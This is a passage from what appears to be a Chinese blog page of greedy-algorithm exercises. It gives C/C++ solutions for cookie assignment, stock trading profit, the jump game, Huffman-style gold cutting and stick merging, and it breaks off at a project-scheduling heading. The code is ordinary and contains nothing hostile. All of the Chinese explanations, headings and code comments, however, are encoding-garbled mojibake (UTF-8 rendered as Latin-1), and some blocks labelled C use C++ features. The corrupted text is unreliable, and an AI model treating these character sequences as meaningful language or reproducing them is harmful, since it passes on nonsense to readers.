&lt;&lt; endl; <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*è´ªå¿ƒç®—æ³•æˆç«‹çš„æ¡ä»¶ï¼š</span><br><span class="hljs-comment">é—®é¢˜ç±»å‹ï¼šæœ¬é¢˜å±äºèµ„æºåˆ†é…é—®é¢˜ï¼Œä¸é›¶é’±æ‰¾é›¶é—®é¢˜ç±»ä¼¼ï¼Œç›®æ ‡æ˜¯å°½å¯èƒ½æ»¡è¶³éœ€æ±‚ã€‚è´ªå¿ƒç®—æ³•åœ¨è¿™ç§æƒ…å†µä¸‹æœ‰æ•ˆï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ›é€šè¿‡åˆç†åˆ†é…èµ„æºæ¥æ»¡è¶³å°½å¯èƒ½å¤šçš„å­©å­ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">æ¡ä»¶æ»¡è¶³ï¼šåœ¨æœ¬é¢˜ä¸­ï¼Œæ¯ä¸ªå­©å­åªèƒ½å¾—åˆ°ä¸€å—é¥¼å¹²ï¼Œå¹¶ä¸”ä¸åŒé¥¼å¹²å¤§å°æ˜¯å¯ä»¥äº’ç›¸æ»¡è¶³çš„ï¼ˆä¸€ä¸ªå¤§é¥¼å¹²æ—¢å¯ä»¥æ»¡è¶³å°èƒƒå£çš„å­©å­ï¼Œä¹Ÿå¯ä»¥æ»¡è¶³å¤§èƒƒå£çš„å­©å­ï¼‰ã€‚å› æ­¤ï¼Œé€šè¿‡è´ªå¿ƒç®—æ³•ä¼˜å…ˆæ»¡è¶³å°èƒƒå£çš„å­©å­ï¼Œå°±èƒ½å°†å‰©ä½™çš„å¤§é¥¼å¹²ç•™ç»™æ›´éœ€è¦çš„å¤§èƒƒå£å­©å­ï¼Œæå‡æ»¡è¶³æ€»äººæ•°ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">é¢å€¼åˆ†æï¼ˆåœ¨æœ¬é¢˜ä¸­çš„å¯¹åº”ï¼‰ï¼š</span><br><span class="hljs-comment">èƒƒå£å¤§å°ä¸é¥¼å¹²å¤§å°åˆ†æï¼š</span><br><span class="hljs-comment">å­©å­çš„èƒƒå£å€¼æ•°ç»„ g å’Œé¥¼å¹²å¤§å°æ•°ç»„ s éƒ½æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºæ’åºã€‚</span><br><span class="hljs-comment">å¦‚æœèƒ½å¤Ÿç”¨ä¸€ä¸ªè¾ƒå°çš„é¥¼å¹²æ»¡è¶³å°èƒƒå£çš„å­©å­ï¼Œé‚£ä¹ˆè¿™å—é¥¼å¹²å¿…ç„¶ä¹Ÿèƒ½æ»¡è¶³æ‰€æœ‰æ¯”è¯¥å­©å­èƒƒå£æ›´å°çš„å­©å­ã€‚å› æ­¤ï¼Œä¼˜å…ˆä½¿ç”¨å°é¥¼å¹²æ»¡è¶³å°èƒƒå£çš„å­©å­å¯ä»¥æœ€å¤§åŒ–æ»¡è¶³éœ€æ±‚ï¼Œå¹¶ç•™å‡ºæ›´å¤šå¤§çš„é¥¼å¹²ç»™å¤§èƒƒå£çš„å­©å­ã€‚</span><br><span class="hljs-comment">å†³ç­–åŒ…å®¹æ€§ï¼š</span><br><span class="hljs-comment">åŒ…å®¹æ€§åˆ†æï¼š</span><br><span class="hljs-comment">åœ¨é€‰æ‹©åˆ†é…é¥¼å¹²æ—¶ï¼Œä¼˜å…ˆé€‰æ‹©æ»¡è¶³å°èƒƒå£çš„å­©å­ï¼Œç¡®ä¿æˆ‘ä»¬æŠŠæœ€å°çš„é¥¼å¹²åˆ†é…ç»™æœ€é€‚åˆçš„å­©å­ã€‚è¿™æ ·å³ä½¿åç»­éœ€æ±‚æ›´å¤§ï¼Œæˆ‘ä»¬ä»ç„¶ä¿æœ‰è¾ƒå¤§é¥¼å¹²ä»¥æ»¡è¶³è¾ƒé«˜çš„éœ€æ±‚ã€‚</span><br><span class="hljs-comment">è¿™ç§é€‰æ‹©åŒ…å«äº†æœªæ¥çš„å¯èƒ½æ€§ï¼ˆå³æ›´å¤§èƒƒå£çš„å­©å­ä»èƒ½å¾—åˆ°è¾ƒå¤§çš„é¥¼å¹²ï¼‰ï¼Œç¡®ä¿èµ„æºåˆ©ç”¨æœ€å¤§åŒ–ï¼Œå¢åŠ æ•´ä½“æ»¡è¶³çš„å¯èƒ½æ€§ã€‚</span><br><span class="hljs-comment">è´ªå¿ƒç­–ç•¥ï¼š</span><br><span class="hljs-comment">è´ªå¿ƒç­–ç•¥ï¼šåœ¨åˆ†é…æ—¶ï¼Œä¼˜å…ˆåˆ†é…å°é¥¼å¹²ç»™å°èƒƒå£çš„å­©å­ï¼Œå°½å¯èƒ½æ»¡è¶³æœ€å°éœ€æ±‚ï¼Œä»è€Œå°†è¾ƒå¤§çš„èµ„æºä¿ç•™ç»™æ›´é«˜éœ€æ±‚çš„æƒ…å†µã€‚è¿™æ ·å¯ä»¥æé«˜æ•´ä½“æ»¡è¶³ç‡ï¼Œå®ç°é¢˜ç›®ç›®æ ‡ã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº"><a href="#ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº" class="headerlink" title="ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº"></a>ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº</h4><p>ç»™å®šä¸€ä¸ªæ•°ç»„ <code>prices</code>ï¼Œå…¶ä¸­ <code>prices[i]</code> è¡¨ç¤ºç¬¬ <code>i</code> å¤©çš„è‚¡ç¥¨ä»·æ ¼ã€‚ ä½ å¯ä»¥å°½å¯èƒ½å¤šæ¬¡ä¹°å–è‚¡ç¥¨ï¼ˆå¤šæ¬¡ä¹°å…¥å’Œå–å‡ºï¼‰ã€‚ä½†åœ¨å†æ¬¡ä¹°å…¥ä¹‹å‰ï¼Œå¿…é¡»å…ˆå–å‡ºè‚¡ç¥¨ã€‚</p><p>ç›®æ ‡æ˜¯è®¾è®¡ä¸€ä¸ªç®—æ³•æ¥è®¡ç®—èƒ½å¤Ÿè·å¾—çš„æœ€å¤§åˆ©æ¶¦ã€‚</p><p>ç¤ºä¾‹</p><p><strong>ç¤ºä¾‹ 1</strong>ï¼š</p><ul><li><p><strong>è¾“å…¥</strong>ï¼š<code>prices = [7, 1, 5, 3, 6, 4]</code></p></li><li><p><strong>è¾“å‡º</strong>ï¼š<code>7</code></p></li><li><p>è§£é‡Šï¼š</p><ul><li>ç¬¬ 2 å¤©ä¹°å…¥ï¼ˆä»·æ ¼ &#x3D; 1ï¼‰ï¼Œç¬¬ 3 å¤©å–å‡ºï¼ˆä»·æ ¼ &#x3D; 5ï¼‰ï¼Œåˆ©æ¶¦ &#x3D; 5 - 1 &#x3D; 4ã€‚</li><li>ç¬¬ 4 å¤©ä¹°å…¥ï¼ˆä»·æ ¼ &#x3D; 3ï¼‰ï¼Œç¬¬ 5 å¤©å–å‡ºï¼ˆä»·æ ¼ &#x3D; 6ï¼‰ï¼Œåˆ©æ¶¦ &#x3D; 6 - 3 &#x3D; 3ã€‚</li><li>æ€»åˆ©æ¶¦ &#x3D; 4 + 3 &#x3D; 7ã€‚</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//è´ªå¿ƒç­–ç•¥æ˜¯åªè¦è‚¡ç¥¨ä»·æ ¼ä¸Šæ¶¨ï¼Œå°±è¿›è¡Œä¸€æ¬¡å–å‡ºï¼ŒæŠŠæ‰€æœ‰ä¸Šæ¶¨çš„åˆ©æ¶¦éƒ½ç´¯åŠ èµ·æ¥ï¼Œæ¯æ¬¡åœ¨ä»·æ ¼ä¸Šæ¶¨çš„å‰ä¸€å¤©ä¹°å…¥ï¼ˆéšè—ï¼‰</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span> prices[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        ans += max(prices[i] - prices[i - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>); <span class="hljs-comment">// å¦‚æœä»Šå¤©ä»·æ ¼æ¯”å‰ä¸€å¤©é«˜ï¼Œç´¯åŠ å·®ä»·</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n; <span class="hljs-comment">// è¾“å…¥è‚¡ç¥¨çš„å¤©æ•°</span><br>    <span class="hljs-type">int</span> prices[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; prices[i]; <span class="hljs-comment">// è¾“å…¥æ¯ä¸€å¤©çš„è‚¡ç¥¨ä»·æ ¼</span><br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; maxProfit(prices, n) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// è¾“å‡ºæœ€å¤§åˆ©æ¶¦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="è·³è·ƒæ¸¸æˆ"><a href="#è·³è·ƒæ¸¸æˆ" class="headerlink" title="è·³è·ƒæ¸¸æˆ"></a>è·³è·ƒæ¸¸æˆ</h4><p>ç»™å®šä¸€ä¸ªéè´Ÿæ•´æ•°æ•°ç»„ <code>nums</code>ï¼Œä½ æœ€åˆä½äºæ•°ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¡¨ç¤ºä½ åœ¨è¯¥ä½ç½®å¯ä»¥è·³è·ƒçš„æœ€å¤§é•¿åº¦ã€‚ç›®æ ‡æ˜¯ä½¿ç”¨æœ€å°‘çš„è·³è·ƒæ¬¡æ•°åˆ°è¾¾æ•°ç»„çš„æœ€åä¸€ä¸ªä½ç½®ã€‚</p><p>ç¤ºä¾‹</p><p><strong>ç¤ºä¾‹ 1</strong>ï¼š</p><ul><li><strong>è¾“å…¥</strong>ï¼š<code>nums = [2,3,1,1,4]</code>   </li><li><strong>è¾“å‡º</strong>ï¼š<code>2</code></li><li><strong>è§£é‡Š</strong>ï¼šè·³åˆ°æœ€åä¸€ä¸ªä½ç½®çš„æœ€å°è·³è·ƒæ•°æ˜¯ 2ã€‚å¯ä»¥å…ˆä»ç´¢å¼• 0 è·³åˆ°ç´¢å¼• 1ï¼Œå†ä»ç´¢å¼• 1 è·³åˆ°æœ€åä¸€ä¸ªä½ç½®ã€‚</li></ul><p><strong>ç¤ºä¾‹ 2</strong>ï¼š</p><ul><li><strong>è¾“å…¥</strong>ï¼š<code>nums = [2,3,0,1,4]</code></li><li><strong>è¾“å‡º</strong>ï¼š<code>2</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//è´ªå¿ƒç­–ç•¥ï¼Œæ¯ä¸€æ¬¡åªéœ€è¦è·³åˆ°å†ä¸€æ¬¡ä¸­æœ€è¿œçš„ç‚¹</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n; <span class="hljs-comment">// è¾“å…¥æ•°ç»„çš„å¤§å°</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// è·³è·ƒæ•°ç»„</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; nums[i]; <span class="hljs-comment">// è¾“å…¥è·³è·ƒæ•°ç»„</span><br>    &#125;<br><br>    <span class="hljs-type">int</span> now = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å½“å‰çš„ä½ç½®</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// è·³è·ƒæ¬¡æ•°</span><br><br>    <span class="hljs-keyword">while</span> (now &lt; n - <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// å½“å‰è¿˜æ²¡åˆ°è¾¾ç»ˆç‚¹</span><br>        <span class="hljs-type">int</span> right = now + nums[now]; <span class="hljs-comment">// å½“å‰èƒ½è·³åˆ°çš„æœ€è¿œèŒƒå›´</span><br>        <span class="hljs-keyword">if</span> (right &gt;= n - <span class="hljs-number">1</span>) &#123;<br>            cout &lt;&lt; ans + <span class="hljs-number">1</span> &lt;&lt; endl; <span class="hljs-comment">// å¦‚æœå¯ä»¥ç›´æ¥è·³åˆ°æœ€åï¼Œè¿”å›ç­”æ¡ˆ+1</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> nextRight = right;<br>        <span class="hljs-type">int</span> next = now;<br><br>        <span class="hljs-comment">// éå†å½“å‰è·³è·ƒèŒƒå›´å†…çš„æ‰€æœ‰ä½ç½®ï¼Œæ‰¾åˆ°èƒ½è·³åˆ°çš„æœ€è¿œä½ç½®</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = now + <span class="hljs-number">1</span>; i &lt;= right; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i + nums[i] &gt; nextRight) &#123; <span class="hljs-comment">// æ›´æ–°æœ€è¿œè·³è·ƒä½ç½®</span><br>                nextRight = i + nums[i];<br>                next = i;<br>            &#125;<br>        &#125;<br><br>        now = next; <span class="hljs-comment">// æ›´æ–°å½“å‰ä½ç½®</span><br>        ans++; <span class="hljs-comment">// å¢åŠ è·³è·ƒæ¬¡æ•°</span><br>    &#125;<br><br>    cout &lt;&lt; ans &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/*è´ªå¿ƒç­–ç•¥ï¼š</span><br><span class="hljs-comment">åœ¨æ¯ä¸€æ­¥è·³è·ƒä¸­ï¼Œé€‰æ‹©å½“å‰å¯ä»¥è·³åˆ°çš„èŒƒå›´å†…çš„æœ€è¿œä½ç½®ï¼Œä»è€Œç¡®ä¿æ¯æ¬¡è·³è·ƒåå¯ä»¥è¾¾åˆ°æ›´å¤§çš„èŒƒå›´ã€‚</span><br><span class="hljs-comment">å‡è®¾ä½ç½® a å¯ä»¥è·³åˆ° b1ã€b2ã€b3ï¼Œè€Œè¿™äº›ä½ç½® b1ã€b2ã€b3 å„è‡ªçš„æœ€è¿œè·³è·ƒä½ç½®ä¸º c1ã€c2ã€c3ã€‚æ­¤æ—¶åº”è¯¥ä» a è·³åˆ°èƒ½å¤Ÿè¾¾åˆ°æœ€è¿œä½ç½®çš„é‚£ä¸ª bï¼Œè¿™æ ·å¯ä»¥ä¿è¯æœªæ¥çš„è·³è·ƒèŒƒå›´æœ€å¤§ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">å†³ç­–åŒ…å®¹æ€§ï¼š</span><br><span class="hljs-comment">é€‰æ‹©ä» a è·³åˆ°â€œèƒ½è·³å¾—æ›´è¿œâ€çš„ bï¼Œå› ä¸ºè¿™ä¸ªé€‰æ‹©ç¡®ä¿æœªæ¥çš„å¯è¾¾é›†åˆåŒ…å«äº†å…¶ä»–è·³è·ƒé€‰æ‹©çš„å¯è¾¾ä½ç½®ã€‚è¿™ç§ç­–ç•¥å³ä½¿ä¸è€ƒè™‘æœªæ¥çš„æ‰€æœ‰å¯èƒ½æƒ…å†µï¼Œä¹Ÿèƒ½ä¿è¯å½“å‰é€‰æ‹©çš„åˆç†æ€§ã€‚</span><br><span class="hljs-comment">ç®€å•æ¥è¯´ï¼Œè¿™ç§å±€éƒ¨æœ€ä¼˜çš„å†³ç­–èƒ½å¤Ÿå¸¦æ¥å…¨å±€æœ€ä¼˜çš„ç»“æœã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è´ªå¿ƒç­–ç•¥</span><br><span class="hljs-comment">è´ªå¿ƒç­–ç•¥ï¼šæœ¬é¢˜çš„è´ªå¿ƒç­–ç•¥æ˜¯åœ¨æ¯ä¸€æ­¥ä¸­é€‰æ‹©èƒ½å¤Ÿè·³åˆ°æœ€è¿œçš„èŒƒå›´ã€‚é€šè¿‡è¿™ç§é€æ­¥æ‰©å±•è·³è·ƒèŒƒå›´çš„æ–¹å¼ï¼Œæ¯ä¸€æ­¥éƒ½æ¥è¿‘ç»ˆç‚¹ï¼Œä»è€Œå‡å°‘æ€»çš„è·³è·ƒæ¬¡æ•°ï¼Œå®ç°æœ€å°æ­¥æ•°ã€‚</span><br></code></pre></td></tr></table></figure><h4 id="å“ˆå¼—æ›¼ç¼–ç ä¸‹çš„é—®é¢˜"><a href="#å“ˆå¼—æ›¼ç¼–ç ä¸‹çš„é—®é¢˜" class="headerlink" title="å“ˆå¼—æ›¼ç¼–ç ä¸‹çš„é—®é¢˜"></a>å“ˆå¼—æ›¼ç¼–ç ä¸‹çš„é—®é¢˜</h4><p>é€šè¿‡æ¯æ¬¡é€‰æ‹©æœ€å°çš„å…ƒç´ åˆå¹¶ï¼Œç¡®ä¿å¾—åˆ°æœ€ä¼˜çš„ç»“æœ</p><p>1.å†¶é‡‘é—®é¢˜</p><p>{10, 20, 30} æˆ‘ä»¬éœ€è¦è¿™äº›é•¿åº¦çš„é‡‘å—ï¼Œæ€»é•¿åº¦ä¸ºæ•°ç»„ä¹‹å’Œï¼Œæ¯æ¬¡åˆ‡å‰²ä¼šæ¶ˆè´¹è¿™ä¸ªå’Œï¼Œæ€ä¹ˆåˆ‡å‰²ä¼šè®©è¾“å‡ºæœ€å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">lessMoney</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq(arr.begin(), arr.end()); <span class="hljs-comment">// å°æ ¹å †</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>, cur = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (pq.size() &gt; <span class="hljs-number">1</span>) &#123;<br>        cur = pq.top(); pq.pop();   <span class="hljs-comment">//å“ˆå¤«æ›¼ç¼–ç æµç¨‹</span><br>        cur += pq.top(); pq.pop();<br>        sum += cur;<br>        pq.push(cur);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; lessMoney(arr) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// è¾“å‡º 90</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.æœ€å°ä»£ä»·åˆå¹¶æœ¨æ£é—®é¢˜</p><p>é—®é¢˜æè¿°ï¼š<br>ç»™å®š <code>n</code> æ ¹æœ¨æ£ï¼Œæ¯æ¬¡å¯ä»¥åˆå¹¶ä¸¤æ ¹æœ¨æ£ï¼Œåˆå¹¶ä¸¤æ ¹æœ¨æ£çš„é•¿åº¦ä¹‹å’Œ<strong>ã€‚æœ€ç»ˆæˆ‘ä»¬è¦æŠŠæ‰€æœ‰æœ¨æ£åˆå¹¶æˆä¸€æ ¹ï¼Œæ±‚</strong>æœ€å°çš„æ€»åˆå¹¶ä»£ä»·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// å‡è®¾æœ¨æ£æ•°é‡æœ€å¤§ä¸º100</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minCostToMergeSticks</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> sticks[])</span> &#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq;  <span class="hljs-comment">// å°æ ¹å †</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// å°†æ‰€æœ‰æœ¨æ£æ”¾å…¥å°æ ¹å †</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        pq.push(sticks[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (pq.size() &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> a = pq.top(); pq.pop();<br>        <span class="hljs-type">int</span> b = pq.top(); pq.pop();<br>        <span class="hljs-type">int</span> cost = a + b;<br>        sum += cost;<br>        pq.push(cost);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;  <span class="hljs-comment">// è¯»å–æœ¨æ£çš„æ•°é‡</span><br>    <span class="hljs-type">int</span> sticks[MAX_N];  <span class="hljs-comment">// é™æ€æ•°ç»„å­˜å‚¨æœ¨æ£é•¿åº¦</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; sticks[i];  <span class="hljs-comment">// è¯»å–æ¯æ ¹æœ¨æ£çš„é•¿åº¦</span><br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; minCostToMergeSticks(n, sticks) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºæœ€å°åˆå¹¶ä»£ä»·</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="é¡¹ç›®å®‰æ’é—®é¢˜"><a href="#é¡¹ç›®å®‰æ’é—®é¢˜" class="headerlink" title="é¡¹ç›®å®‰æ’é—®é¢˜"></a>é¡¹ç›®å®‰æ’é—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 